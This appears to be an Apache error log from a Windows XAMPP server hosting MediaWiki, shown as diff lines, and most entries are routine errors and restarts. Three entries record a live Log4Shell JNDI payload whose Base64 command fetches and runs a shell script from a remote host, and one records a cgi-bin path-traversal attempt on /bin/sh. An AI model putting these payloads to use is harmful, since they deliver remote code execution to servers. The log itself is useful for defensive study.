+[Fri Apr 22 05:53:37.757086 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59765] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2&peek=1&from=20220421215321&isAnon=false&action=render HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%9C%80%E8%BF%91%E6%9B%B4%E6%94%B9?hidebots=1&limit=50&days=7&enhanced=1&urlversion=2
+[Fri Apr 22 05:54:35.273704 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60010] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E9%93%BE%E5%85%A5%E9%A1%B5%E9%9D%A2/%E8%AE%A8%E8%AE%BA:%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=%E8%AE%A8%E8%AE%BA:%E9%A6%96%E9%A1%B5&action=edit&redlink=1
+[Fri Apr 22 05:54:36.463156 2022] [core:error] [pid 5188:tid 1800] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60016] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%97%A5%E5%BF%97?page=%E8%AE%A8%E8%AE%BA:%E9%A6%96%E9%A1%B5 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=%E8%AE%A8%E8%AE%BA:%E9%A6%96%E9%A1%B5&action=edit&redlink=1
+[Fri Apr 22 06:59:25.350731 2022] [authz_core:error] [pid 5188:tid 1800] [client 83.97.20.34:52784] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 07:56:53.358936 2022] [authz_core:error] [pid 5188:tid 1800] [client 103.203.57.10:53206] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 09:26:38.454377 2022] [authz_core:error] [pid 5188:tid 1808] [client 35.195.93.98:59830] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 11:31:02.431133 2022] [authz_core:error] [pid 5188:tid 1808] [client 83.97.20.34:55369] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 12:09:49.640418 2022] [authz_core:error] [pid 5188:tid 1792] [client 154.209.125.50:62943] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 12:31:44.374393 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 142.93.176.178:44784] AH00127: Cannot map GET /:80:undefined?id= HTTP/1.1 to file, referer: t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//200.150.199.13:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yNDMuMTk4LjE4OC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8xOTEuMjQzLjE5OC4xODgvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
+[Fri Apr 22 12:46:37.938039 2022] [core:error] [pid 5188:tid 1792] (20024)The given path is misformatted or contained invalid characters: [client 142.93.176.178:59264] AH00127: Cannot map GET /:80:undefined?id= HTTP/1.1 to file, referer: t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//200.150.199.13:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yNDMuMTk4LjE4OC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8xOTEuMjQzLjE5OC4xODgvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
+[Fri Apr 22 13:56:53.412630 2022] [authz_core:error] [pid 5188:tid 1792] [client 192.241.216.172:37192] AH01630: client denied by server configuration: C:/xamppp/htdocs/actuator
+[Fri Apr 22 14:17:01.625222 2022] [authz_core:error] [pid 5188:tid 1800] [client 45.134.144.140:34898] AH01630: client denied by server configuration: C:/xamppp/htdocs/remote
+[Fri Apr 22 15:26:03.027894 2022] [core:error] [pid 5188:tid 1800] (20024)The given path is misformatted or contained invalid characters: [client 142.93.176.178:48822] AH00127: Cannot map GET /:443:undefined?id= HTTP/1.1 to file, referer: t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//200.150.199.13:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yNDMuMTk4LjE4OC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8xOTEuMjQzLjE5OC4xODgvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
+[Fri Apr 22 15:33:12.239836 2022] [authz_core:error] [pid 5188:tid 1800] [client 192.241.219.103:34442] AH01630: client denied by server configuration: C:/xamppp/htdocs/owa
+[Fri Apr 22 15:44:57.135016 2022] [authz_core:error] [pid 5188:tid 1792] [client 178.73.215.171:55814] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 15:57:52.586088 2022] [authz_core:error] [pid 5188:tid 1796] [client 83.97.20.34:8806] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 17:15:32.414476 2022] [core:error] [pid 5188:tid 1796] [client 45.155.204.146:53278] AH00126: Invalid URI in request 'bin/sh' 'POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1'
+[Fri Apr 22 18:46:21.055821 2022] [authz_core:error] [pid 5188:tid 1796] [client 103.153.254.110:47954] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 20:00:26.818701 2022] [core:error] [pid 5188:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:54300] AH00127: Cannot map GET /mediawiki/index.php/RiverPedia:%E9%9A%90%E7%A7%81%E6%94%BF%E7%AD%96 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 20:00:28.682967 2022] [core:error] [pid 5188:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:54305] AH00127: Cannot map GET /mediawiki/index.php/RiverPedia:%E5%85%B3%E4%BA%8E HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 20:00:31.147817 2022] [core:error] [pid 5188:tid 1836] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:54317] AH00127: Cannot map GET /mediawiki/index.php/RiverPedia:%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 20:07:22.042362 2022] [core:error] [pid 5188:tid 1784] (20024)The given path is misformatted or contained invalid characters: [client 112.53.2.65:43090] AH00127: Cannot map GET /mediawiki/index.php/RiverPedia:%E9%9A%90%E7%A7%81%E6%94%BF%E7%AD%96 HTTP/1.1 to file
+[Fri Apr 22 20:20:30.062931 2022] [mpm_winnt:notice] [pid 7940:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 20:20:32.065846 2022] [mpm_winnt:notice] [pid 5188:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 20:20:32.458440 2022] [mpm_winnt:notice] [pid 7940:tid 576] AH00430: Parent: Child process 5188 exited successfully.
+[Fri Apr 22 20:20:35.757270 2022] [ssl:warn] [pid 432:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:20:35.794378 2022] [ssl:warn] [pid 432:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:20:35.841245 2022] [mpm_winnt:notice] [pid 432:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 20:20:35.841245 2022] [mpm_winnt:notice] [pid 432:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 20:20:35.841245 2022] [core:notice] [pid 432:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 20:20:35.844180 2022] [mpm_winnt:notice] [pid 432:tid 576] AH00418: Parent: Created child process 7356
+[Fri Apr 22 20:20:36.208440 2022] [ssl:warn] [pid 7356:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:20:36.240670 2022] [ssl:warn] [pid 7356:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:20:36.268984 2022] [mpm_winnt:notice] [pid 7356:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 20:26:20.550228 2022] [authz_core:error] [pid 7356:tid 1824] [client 83.97.20.34:27241] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 20:40:26.837010 2022] [core:error] [pid 7356:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55521] AH00127: Cannot map GET /MediaWiki:Evelution.css HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:40:32.928813 2022] [core:error] [pid 7356:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55599] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E9%93%BE%E5%85%A5%E9%A1%B5%E9%9D%A2//Mediawiki/ HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:40:41.511821 2022] [core:error] [pid 7356:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55666] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:EditPage//Mediawiki/ HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:41:25.606551 2022] [core:error] [pid 7356:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:55951] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:EditPage//Mediawiki/ HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:41:34.227649 2022] [core:error] [pid 7356:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:56026] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6 HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:43:52.326298 2022] [core:error] [pid 7356:tid 1816] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:56926] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6 HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:45:03.767731 2022] [core:error] [pid 7356:tid 1816] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:57369] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6 HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:45:11.992325 2022] [core:error] [pid 7356:tid 1816] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:57437] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6 HTTP/1.1 to file, referer: http://121.4.151.34//Mediawiki/
+[Fri Apr 22 20:57:21.029753 2022] [authz_core:error] [pid 7356:tid 1824] [client 192.241.220.120:44526] AH01630: client denied by server configuration: C:/xamppp/htdocs/
+[Fri Apr 22 20:59:20.758330 2022] [mpm_winnt:notice] [pid 432:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 20:59:22.760277 2022] [mpm_winnt:notice] [pid 7356:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 20:59:23.071792 2022] [mpm_winnt:notice] [pid 432:tid 576] AH00430: Parent: Child process 7356 exited successfully.
+[Fri Apr 22 20:59:24.230004 2022] [ssl:warn] [pid 5604:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:59:24.266140 2022] [ssl:warn] [pid 5604:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:59:24.303260 2022] [mpm_winnt:notice] [pid 5604:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 20:59:24.303260 2022] [mpm_winnt:notice] [pid 5604:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 20:59:24.303260 2022] [core:notice] [pid 5604:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 20:59:24.305204 2022] [mpm_winnt:notice] [pid 5604:tid 580] AH00418: Parent: Created child process 7504
+[Fri Apr 22 20:59:24.594271 2022] [ssl:warn] [pid 7504:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:59:24.624542 2022] [ssl:warn] [pid 7504:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 20:59:24.650901 2022] [mpm_winnt:notice] [pid 7504:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:03:13.234991 2022] [mpm_winnt:notice] [pid 5604:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:03:15.236922 2022] [mpm_winnt:notice] [pid 7504:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:03:15.520128 2022] [mpm_winnt:notice] [pid 5604:tid 580] AH00430: Parent: Child process 7504 exited successfully.
+[Fri Apr 22 21:03:16.839472 2022] [ssl:warn] [pid 7780:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:03:16.874631 2022] [ssl:warn] [pid 7780:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:03:16.907827 2022] [mpm_winnt:notice] [pid 7780:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:03:16.907827 2022] [mpm_winnt:notice] [pid 7780:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:03:16.907827 2022] [core:notice] [pid 7780:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:03:16.910765 2022] [mpm_winnt:notice] [pid 7780:tid 580] AH00418: Parent: Created child process 5696
+[Fri Apr 22 21:03:17.197870 2022] [ssl:warn] [pid 5696:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:03:17.231073 2022] [ssl:warn] [pid 5696:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:03:17.259399 2022] [mpm_winnt:notice] [pid 5696:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:10:59.507261 2022] [mpm_winnt:notice] [pid 7780:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:11:01.510175 2022] [mpm_winnt:notice] [pid 5696:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:11:01.810952 2022] [mpm_winnt:notice] [pid 7780:tid 580] AH00430: Parent: Child process 5696 exited successfully.
+[Fri Apr 22 21:11:04.017021 2022] [ssl:warn] [pid 7408:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:11:04.058038 2022] [ssl:warn] [pid 7408:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:11:04.090257 2022] [mpm_winnt:notice] [pid 7408:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:11:04.090257 2022] [mpm_winnt:notice] [pid 7408:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:11:04.090257 2022] [core:notice] [pid 7408:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:11:04.093193 2022] [mpm_winnt:notice] [pid 7408:tid 576] AH00418: Parent: Created child process 3800
+[Fri Apr 22 21:11:04.388117 2022] [ssl:warn] [pid 3800:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:11:04.419364 2022] [ssl:warn] [pid 3800:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:11:04.446707 2022] [mpm_winnt:notice] [pid 3800:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:37:14.974466 2022] [mpm_winnt:notice] [pid 7408:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:37:16.976403 2022] [mpm_winnt:notice] [pid 3800:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:37:17.277194 2022] [mpm_winnt:notice] [pid 7408:tid 576] AH00430: Parent: Child process 3800 exited successfully.
+[Fri Apr 22 21:37:18.527195 2022] [ssl:warn] [pid 824:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:37:18.564313 2022] [ssl:warn] [pid 824:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:37:18.596535 2022] [mpm_winnt:notice] [pid 824:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:37:18.596535 2022] [mpm_winnt:notice] [pid 824:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:37:18.596535 2022] [core:notice] [pid 824:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:37:18.600445 2022] [mpm_winnt:notice] [pid 824:tid 588] AH00418: Parent: Created child process 6060
+[Fri Apr 22 21:37:18.884627 2022] [ssl:warn] [pid 6060:tid 120] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:37:18.914894 2022] [ssl:warn] [pid 6060:tid 120] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:37:18.942235 2022] [mpm_winnt:notice] [pid 6060:tid 120] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:41:44.531453 2022] [mpm_winnt:notice] [pid 824:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:41:46.533400 2022] [mpm_winnt:notice] [pid 6060:tid 120] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:41:46.825392 2022] [mpm_winnt:notice] [pid 824:tid 588] AH00430: Parent: Child process 6060 exited successfully.
+[Fri Apr 22 21:41:47.910363 2022] [ssl:warn] [pid 2928:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:41:47.946494 2022] [ssl:warn] [pid 2928:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:41:47.980674 2022] [mpm_winnt:notice] [pid 2928:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:41:47.980674 2022] [mpm_winnt:notice] [pid 2928:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:41:47.980674 2022] [core:notice] [pid 2928:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:41:47.982642 2022] [mpm_winnt:notice] [pid 2928:tid 580] AH00418: Parent: Created child process 7332
+[Fri Apr 22 21:41:48.265836 2022] [ssl:warn] [pid 7332:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:41:48.297088 2022] [ssl:warn] [pid 7332:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:41:48.325411 2022] [mpm_winnt:notice] [pid 7332:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:43:55.798095 2022] [mpm_winnt:notice] [pid 2928:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:43:57.800018 2022] [mpm_winnt:notice] [pid 7332:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:43:58.064673 2022] [mpm_winnt:notice] [pid 2928:tid 580] AH00430: Parent: Child process 7332 exited successfully.
+[Fri Apr 22 21:43:59.402575 2022] [ssl:warn] [pid 4004:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:43:59.440659 2022] [ssl:warn] [pid 4004:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:43:59.475805 2022] [mpm_winnt:notice] [pid 4004:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:43:59.475805 2022] [mpm_winnt:notice] [pid 4004:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:43:59.475805 2022] [core:notice] [pid 4004:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:43:59.477775 2022] [mpm_winnt:notice] [pid 4004:tid 576] AH00418: Parent: Created child process 6760
+[Fri Apr 22 21:43:59.760968 2022] [ssl:warn] [pid 6760:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:43:59.792219 2022] [ssl:warn] [pid 6760:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:43:59.820539 2022] [mpm_winnt:notice] [pid 6760:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:44:36.472892 2022] [mpm_winnt:notice] [pid 4004:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:44:38.475809 2022] [mpm_winnt:notice] [pid 6760:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:44:38.746319 2022] [mpm_winnt:notice] [pid 4004:tid 576] AH00430: Parent: Child process 6760 exited successfully.
+[Fri Apr 22 21:44:40.063698 2022] [ssl:warn] [pid 7100:tid 592] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:44:40.098869 2022] [ssl:warn] [pid 7100:tid 592] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:44:40.133042 2022] [mpm_winnt:notice] [pid 7100:tid 592] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:44:40.133042 2022] [mpm_winnt:notice] [pid 7100:tid 592] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:44:40.133042 2022] [core:notice] [pid 7100:tid 592] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:44:40.134997 2022] [mpm_winnt:notice] [pid 7100:tid 592] AH00418: Parent: Created child process 4616
+[Fri Apr 22 21:44:40.504146 2022] [ssl:warn] [pid 4616:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:44:40.535392 2022] [ssl:warn] [pid 4616:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:44:40.563712 2022] [mpm_winnt:notice] [pid 4616:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:48:18.249198 2022] [mpm_winnt:notice] [pid 7100:tid 592] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:48:20.251132 2022] [mpm_winnt:notice] [pid 4616:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:48:20.544103 2022] [mpm_winnt:notice] [pid 7100:tid 592] AH00430: Parent: Child process 4616 exited successfully.
+[Fri Apr 22 21:48:21.786283 2022] [ssl:warn] [pid 5864:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:48:21.827296 2022] [ssl:warn] [pid 5864:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:48:21.860509 2022] [mpm_winnt:notice] [pid 5864:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:48:21.860509 2022] [mpm_winnt:notice] [pid 5864:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:48:21.860509 2022] [core:notice] [pid 5864:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:48:21.867348 2022] [mpm_winnt:notice] [pid 5864:tid 588] AH00418: Parent: Created child process 7720
+[Fri Apr 22 21:48:22.163246 2022] [ssl:warn] [pid 7720:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:48:22.194495 2022] [ssl:warn] [pid 7720:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:48:22.225745 2022] [mpm_winnt:notice] [pid 7720:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:56:20.995300 2022] [mpm_winnt:notice] [pid 5864:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:56:22.998215 2022] [mpm_winnt:notice] [pid 7720:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:56:23.326340 2022] [mpm_winnt:notice] [pid 5864:tid 588] AH00430: Parent: Child process 7720 exited successfully.
+[Fri Apr 22 21:56:24.512885 2022] [ssl:warn] [pid 1108:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:56:24.548032 2022] [ssl:warn] [pid 1108:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:56:24.582212 2022] [mpm_winnt:notice] [pid 1108:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:56:24.582212 2022] [mpm_winnt:notice] [pid 1108:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:56:24.582212 2022] [core:notice] [pid 1108:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:56:24.588084 2022] [mpm_winnt:notice] [pid 1108:tid 588] AH00418: Parent: Created child process 764
+[Fri Apr 22 21:56:24.874204 2022] [ssl:warn] [pid 764:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:56:24.905456 2022] [ssl:warn] [pid 764:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:56:24.932793 2022] [mpm_winnt:notice] [pid 764:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:58:45.730660 2022] [mpm_winnt:notice] [pid 1108:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 21:58:47.732609 2022] [mpm_winnt:notice] [pid 764:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 21:58:48.019717 2022] [mpm_winnt:notice] [pid 1108:tid 588] AH00430: Parent: Child process 764 exited successfully.
+[Fri Apr 22 21:58:49.648626 2022] [ssl:warn] [pid 6528:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:58:49.692578 2022] [ssl:warn] [pid 6528:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
